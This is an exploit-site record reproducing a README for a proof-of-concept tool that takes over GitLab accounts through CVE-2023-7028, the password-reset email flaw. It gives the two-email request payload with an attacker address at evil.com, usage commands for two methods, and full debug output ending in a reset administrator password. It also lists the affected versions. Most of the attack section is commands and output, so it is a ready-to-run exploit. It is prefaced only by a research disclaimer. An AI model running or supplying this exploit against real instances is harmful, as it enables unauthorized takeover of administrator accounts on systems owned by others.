[
  {
    "source": "## https://sploitus.com/exploit?id=CF980034-AC17-5785-B6A3-F480381970F1\n# CVE-2023-7028 | Account-Take-Over Gitlab\r\n\r\n## Disclamer\r\nThis code is a proof of concept of the vulnerability, I'm not pushing anyone to use it on gitlab instances they don't own.  \r\nThis tool has been developed for research and educational purposes only and I will not be held responsible for any use you may make of it.\r\n\r\n## Description: \r\n\r\nCVE-2023-7028 refers to an Account-Take-Over vulnerability that allows users to take control of the gitlab administrator account without user interaction.\r\n\r\nThe vulnerability lies in the management of emails when resetting passwords. An attacker can provide 2 emails and the reset code will be sent to both.   \r\nIt is therefore possible to provide the e-mail address of the target account as well as that of the attacker, and to reset the administrator password.  \r\n*(Gitlab points out that 2-factor authentication prevents this vulnerability from being exploited, since an attacker, even after resetting the password, will not be able to log in.)*  \r\n\r\nThis vulnerability was discovered by [asterion04](https://hackerone.com/asterion04)\r\n\r\n## Payload:\r\nHere's an example payload\r\n```\r\nuser[email][]=my.target@example.com&user[email][]=hacker@evil.com\r\n```\r\n\r\n## POC:\r\n\r\n##### Method 1: Using temp email\r\n```bash\r\npython3 ./CVE-2023-7028.py -u https://gitlab.example.com/ -t my.target@example.com\r\n\r\n[DEBUG] Getting temporary mail\r\n[DEBUG] Scrapping available domains on 1secmail.com\r\n[DEBUG] 8 domains found\r\n[DEBUG] Temporary mail: 6grp7ert9y@laafd.com\r\n[DEBUG] Getting authenticity_token ...\r\n[DEBUG] authenticity_token = bc91lpzwTOaY9dg5SWjLvvDDb61j6ZunCX4DXYlSnWz9Y3zK35SPiLNShhrDrPVDgY_AzQjzpD5qVt2WXeolog\r\n[DEBUG] Sending reset password request\r\n[DEBUG] Emails sended to my.target@example.com and hacker@evil.com !\r\n[DEBUG] Waiting mail, sleeping for 7.5 seconds\r\n[DEBUG] Getting link using temp-mail | Try NÂ°1 on 5\r\n[DEBUG] Getting last mail for 6grp7ert9y@laafd.com\r\n[DEBUG] 1 mail(s) found\r\n[DEBUG] Reading the last one\r\n[DEBUG] Generating new password\r\n[DEBUG] Getting authenticity_token ...\r\n[DEBUG] authenticity_token = RN6gypVz7Zxtu2zRsJmKPsDHNumIH_UPvdn7aQoWRBnUcqmW1hcu8kYcMvI6XbTDsYuZieMFypbe8SWi3q781w\r\n[DEBUG] Changing password to l3mG2v2XN4UBzbN18ZkW\r\n[DEBUG] CVE_2023_7028 succeed !\r\n        You can connect on https://gitlab.example.com/users/sign_in\r\n        Username: my.target@example.com\r\n        Password: l3mG2v2XN4UBzbN18ZkW\r\n```\r\n\r\n##### Method 2: Using evil email\r\n```bash\r\npython3 ./CVE-2023-7028.py -u https://gitlab.example.com/ -t my.target@example.com -e hacker@evil.com\r\n\r\n[DEBUG] Getting authenticity_token ...\r\n[DEBUG] authenticity_token = 1Yt1EUeWSL-oiSV7v1Z6ghdCDG3w0FFCQB8Uc5B5GAodVNJ26OlPT8HtYYleGXB9F0otas3gnHOtRfhFall8pQ\r\n[DEBUG] Sending reset password request\r\n[DEBUG] Emails sended to my.target@example.com and hacker@evil.com !\r\n        Input link received by mail: https://gitlab.example.com/users/password/edit?reset_password_token=U8PSU7DXdebdTD3GjMiX\r\n[DEBUG] Generating new password\r\n[DEBUG] Getting authenticity_token ...\r\n[DEBUG] authenticity_token = N7gs43C9ZMxdniA9UEzzfH2Rlhgejt75M1Kw88vaarP_Z4uE38JjPDT6ZM-xA_mDfZm3HyO-E8jeCFzFMfoOHA\r\n[DEBUG] Changing password to EU7XIYjlawjb5tH2jgmU\r\n[DEBUG] CVE_2023_7028 succeed !\r\n        You can connect on https://gitlab.example.com/users/sign_in\r\n        Username: my.target@example.com\r\n        Password: EU7XIYjlawjb5tH2jgmU\r\n```\r\n\r\n\r\n## Help\r\n```md\r\n$ python3 .\\CVE-2023-7028.py -h\r\nusage: CVE-2023-7028.py [-h] -u URL -t TARGET [-e EVIL]\r\n\r\nThis tool automates CVE-2023-7028 on gitlab\r\n\r\noptional arguments:\r\n  -h, --help            show this help message and exit\r\n  -u URL, --url URL     Gitlab url\r\n  -t TARGET, --target TARGET\r\n                        Target email\r\n  -e EVIL, --evil EVIL  Evil email\r\n  -p PASSWORD, --password PASSWORD\r\n                        Password\r\n```\r\n\r\n#### Note:\r\nWithout the `--evil` option, which specifies the attacker's email address, the script uses a **public temp-mail** to find the password reset link.   \r\n=> *Be careful if this poc is used during a pentest.*\r\n\r\n\r\n\r\n## Versions concerned\r\n- 16.1 to 16.1.5\r\n- 16.2 to 16.2.8\r\n- 16.3 to 16.3.6\r\n- 16.4 to 16.4.4\r\n- 16.5 to 16.5.5\r\n- 16.6 to 16.6.3\r\n- 16.7 to 16.7.1\r\n\r\n## References: \r\n- https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/\r\n- https://docs.gitlab.com/ee/install/docker.html\r\n- https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0030/",
    "id": "CF980034-AC17-5785-B6A3-F480381970F1",
    "href": "https://github.com/Vozec/CVE-2023-7028",
    "title": "Exploit for Weak Password Recovery Mechanism for Forgotten Password in Gitlab"
  }
]
